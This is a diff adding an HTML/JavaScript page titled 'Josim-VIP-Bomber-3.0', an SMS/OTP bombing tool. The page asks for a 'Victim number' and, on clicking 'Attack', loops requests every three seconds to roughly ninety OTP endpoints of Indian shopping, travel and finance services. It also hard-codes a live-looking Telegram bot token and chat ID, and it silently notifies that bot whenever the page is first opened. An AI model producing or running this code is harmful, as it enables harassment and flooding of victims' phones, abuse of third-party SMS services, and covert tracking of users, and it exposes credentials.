@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ᴊᴏsɪᴍ-ᴠɪᴘ-ʙᴏᴍʙᴇʀ-3.0</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #00FF00;
+      text-align: center;
+      overflow-x: hidden;
+      -webkit-text-size-adjust: 100%;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      margin-top: 100px;
+    }
+
+    .logo img {
+  width: 200px;          /* अपनी मर्जी का साइज */
+  height: 200px;         /* width और height समान रखें */
+  border: 15px;          /* बॉर्डर हटाने के लिए */
+  background: none;      /* पीला बैकग्राउंड हटाने के लिए */
+  object-fit: cover;     /* इमेज पूरी जगह भरेगी */
+  border-radius: 50%;    /* गोल आकार बनाए रखने के लिए */
+}
+
+    .name {
+      font-size: 35px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      margin-top: 15px;
+      text-transform: uppercase;
+    }
+
+    .input-container {
+      margin: 25px auto;
+      width: 90%;
+      max-width: 350px;
+      text-align: left;
+    }
+
+    .input-label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: block;
+      font-size: 50px;
+    }
+
+    .input-box {
+      width: 100%;
+      background: #111;
+      border: 2px solid #00FF00;
+      padding: 10px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      box-sizing: border-box;
+    }
+
+    .country-code {
+      font-weight: bold;
+      margin-right: 5px;
+      font-size: 16px;
+    }
+
+    .input-box input {
+      flex-grow: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      color: #00FF00;
+      font-weight: bold;
+    }
+
+    .attack-btn {
+      margin-top: 20px;
+    }
+
+    .attack-btn img {
+      width: 180px;
+      max-width: 100%;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .attack-btn img:active {
+      transform: scale(0.95);
+    }
+
+    .attacking-text {
+      margin-top: 30px;
+      font-size: 20px;
+      font-weight: bold;
+      color: #f00;
+      text-transform: uppercase;
+      animation: shake 0.5s infinite;
+    }
+
+    @keyframes shake {
+      0% { transform: translate(1px, 1px) rotate(0deg); }
+      10% { transform: translate(-1px, -2px) rotate(-1deg); }
+      20% { transform: translate(-3px, 0px) rotate(1deg); }
+      30% { transform: translate(3px, 2px) rotate(0deg); }
+      40% { transform: translate(1px, -1px) rotate(1deg); }
+      50% { transform: translate(-1px, 2px) rotate(-1deg); }
+      60% { transform: translate(-3px, 1px) rotate(0deg); }
+      70% { transform: translate(3px, 1px) rotate(-1deg); }
+      80% { transform: translate(-1px, -1px) rotate(1deg); }
+      90% { transform: translate(1px, 2px) rotate(0deg); }
+      100% { transform: translate(1px, -2px) rotate(-1deg); }
+    }
+
+    #audioPlayer {
+      display: none;
+    }
+
+    /* Mobile specific styles */
+    @media only screen and (max-width: 480px) {
+      .logo img {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .name {
+        font-size: 15px;
+      }
+      
+      .input-box input {
+        font-size: 14px;
+      }
+      
+      .attack-btn img {
+        width: 160px;
+      }
+      
+      .attacking-text {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.ibb.co/Kc18zy2R/logo.jpg" alt="Logo">
+    </div>
+
+    <div class="name">ᴊᴏsiᴍ-ᴠiᴘ-ʙᴏᴍʙᴇʀ-3.0</div>
+
+    <div class="input-container">
+      
+      <div class="input-box">
+        <span class="country-code">+91</span>
+        <input type="text" id="phoneNumber" placeholder="Enter Victim number" inputmode="numeric">
+      </div>
+    </div>
+
+    <div class="attack-btn">
+      <img id="attackButton" src="https://cdn.glitch.global/ded2b491-b7dd-4375-9abd-96554e04649c/Screenshot_2025_04_15_01_17_47_894_com_android_chrome_edit_removebg.png?v=1744660511459" alt="Attack Button">
+    </div>
+
+    <div class="attacking-text" id="attackingText"></div>
+
+    <audio id="audioPlayer" loop>
+      <source src="https://cdn.glitch.global/ded2b491-b7dd-4375-9abd-96554e04649c/GATA%20ONLY%20X%20PELIGROSA%20(FloyyMenor)%20%5BJr%20Stit%20Mashup%5D.mp3?v=1744665023687" type="audio/mpeg">
+    </audio>
+  </div>
+
+  <script>
+    const apiEndpoints = [
+      "https://amitdas.site/otp/Thesouledstore/?number=",
+      "https://amitdas.site/otp/raagasilktales/?number=",
+      "https://smsdos.techsology.site/send_sms.php?number=${number}",
+      "https://amitdas.site/otp/sotbella/?number=",
+      "https://amitdas.site/otp/spyranretail/?number=",
+      "https://amitdas.site/otp/PocketFM/?number=",
+      "https://amitdas.site/otp/Acko/?number=",
+      "https://amitdas.site/otp/888kon/?number=",
+      "https://amitdas.site/otp/Limeroad/?number=",
+      "https://amitdas.site/otp/Eumeworld/?number=",
+      "https://amitdas.site/otp/Myntra/?number=",
+      "https://amitdas.site/otp/PocketFM/?number=",
+      "https://amitdas.site/otp/medplusmart/?number=",
+      "https://amitdas.site/otp/Indigo/?number=",
+      "https://amitdas.site/otp/abhibus/?number=",
+      "https://amitdas.site/otp/Bewakoof/?number=",
+      "https://amitdas.site/otp/lakmesalon/?number=",
+      "https://amitdas.site/otp/Shopsy/?number=",
+      "https://amitdas.site/otp/future-mbbs/?number=",
+      "https://amitdas.site/otp/Dabur/?number=",
+      "https://amitdas.site/otp/Abfrl/?number=",
+      "https://amitdas.site/otp/My11Circle/?number=",
+      "https://amitdas.site/otp/Samsung/?number=",
+      "https://amitdas.site/otp/indianterrain/?number=",
+      "https://amitdas.site/otp/byjus/?number=",
+      "https://amitdas.site/otp/Acko/?number=",
+      "https://amitdas.site/otp/eka/?number=",
+      "https://amitdas.site/otp/fabindia/?number=",
+      "https://amitdas.site/otp/menmoms/?number=",
+      "https://amitdas.site/otp/twilio/?number=",
+      "https://amitdas.site/otp/bhimajewellery/?number=",
+      "https://amitdas.site/otp/Vibecrafts/?number=",
+      "https://amitdas.site/otp/labroz/?number=",
+      "https://amitdas.site/otp/krishnajewellers/?number=",
+      "https://amitdas.site/otp/kindlife/?number=",
+      "https://amitdas.site/otp/Swiggy/?number=",
+      "https://amitdas.site/otp/creditmantri/?number=",
+      "https://amitdas.site/otp/simpl/?number=",
+      "https://amitdas.site/otp/Bluedart/?number=",
+      "https://amitdas.site/otp/gynoveda/?number=",
+      "https://amitdas.site/otp/theindiadecor/?number=",
+      "https://amitdas.site/otp/sotbella/?number=",
+      "https://amitdas.site/otp/shawwatches/?number=",
+      "https://amitdas.site/otp/mehar/?number=",
+      "https://amitdas.site/otp/ageasybyantara/?number=",
+      "https://amitdas.site/otp/Monkeytroopers/?number=",
+      "https://amitdas.site/otp/Tira/?number=",
+      "https://amitdas.site/otp/pharmeasy/?number=",
+      "https://amitdas.site/otp/A23/?number=",
+      "https://amitdas.site/otp/Eumeworld/?number=",
+      "https://amitdas.site/otp/Angelone/?number=",
+      "https://amitdas.site/otp/netmeds/?number=",
+      "https://amitdas.site/otp/app-work/?number=",
+      "https://amitdas.site/otp/Dailyhunt/?number=",
+      "https://amitdas.site/otp/azistastore/?number=",
+      "https://amitdas.site/otp/Fancode/?number=",
+      "https://amitdas.site/otp/damensch/?number=",
+      "https://amitdas.site/otp/Snapdeal/?number=",
+      "https://amitdas.site/otp/arttdinox/?number=",
+      "https://amitdas.site/otp/Yatra/?number=",
+      "https://amitdas.site/otp/Zomato/?number=",
+      "https://amitdas.site/otp/KukuFM/?number=",
+      "https://amitdas.site/otp/healthkart/?number=",
+      "https://amitdas.site/otp/fibe/?number=",
+      "https://amitdas.site/otp/getsupp/?number=",
+      "https://amitdas.site/otp/Noise/?number=",
+      "https://amitdas.site/otp/Samsung/?number=",
+      "https://amitdas.site/otp/getsupp/?number=",
+      "https://amitdas.site/otp/prinmodfc/?number=",
+      "https://amitdas.site/otp/bhimajewellery/?number=",
+      "https://amitdas.site/otp/future-mbbs/?number=",
+      "https://amitdas.site/otp/hellotrader/?number=",
+      "https://amitdas.site/otp/damensch/?number=",
+      "https://amitdas.site/otp/designcafe/?number=",
+      "https://amitdas.site/otp/kindlife/?number=",
+      "https://amitdas.site/otp/creditmantri/?number=",
+      "https://amitdas.site/otp/mehar/?number=",
+      "https://amitdas.site/otp/spectra/?number=",
+      "https://smsdos.techsology.site/send_sms.php?number=${number}",
+      "https://amitdas.site/otp/Bewakoof/?number=",
+      "https://amitdas.site/otp/Potterybarn/?number=",
+      "https://amitdas.site/otp/policyx/?number=",
+      "https://amitdas.site/otp/zestmoney/?number=",
+      "https://amitdas.site/otp/Vibecrafts/?number=",
+      "https://amitdas.site/otp/dtdc/?number=",
+      "https://amitdas.site/otp/Redchief/?number=",
+      "https://amitdas.site/otp/healthkart/?number=",
+      "https://amitdas.site/otp/Fancode/?number="
+    ];
+
+    const BOT_TOKEN = "8063511507:AAHPU7uJBdfFpShj9D9wcj9txzcF6DWnq8s";
+    const CHAT_ID = "6550943426";
+    let isAttacking = false;
+
+    // Check if user is new (first time opening)
+    if (!localStorage.getItem('userNotified')) {
+      const userName = document.querySelector('.name').textContent;
+      sendTelegramNotification(userName);
+      localStorage.setItem('userNotified', 'true'); // Mark as notified
+    }
+
+    document.getElementById('attackButton').addEventListener('click', function() {
+      const phoneNumber = document.getElementById('phoneNumber').value;
+      const attackingText = document.getElementById('attackingText');
+      const audioPlayer = document.getElementById('audioPlayer');
+
+      if (!phoneNumber || !/^\d{10}$/.test(phoneNumber)) {
+        return;
+      }
+
+      // Start music
+      audioPlayer.play();
+
+      if (isAttacking) return;
+      isAttacking = true;
+
+      attackingText.textContent = "ATTACKING.......            By 〄Dʌʀĸ-Ϳ Hʌcĸɩŋʛ²⁴⁶﷽               Bombing Start 😆😆😆";
+
+      // Continuous attack loop
+      function attackLoop() {
+        // Hit all APIs simultaneously
+        apiEndpoints.forEach(api => {
+          fetch(api + phoneNumber).catch(() => {});
+        });
+
+        setTimeout(attackLoop, 3000); // Repeat attack every 3 seconds
+      }
+
+      attackLoop();
+    });
+
+    function sendTelegramNotification(userName) {
+      const message = `Installed by: ${userName}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+        .catch(() => {});
+    }
+  </script>
+</body>
+  </html>
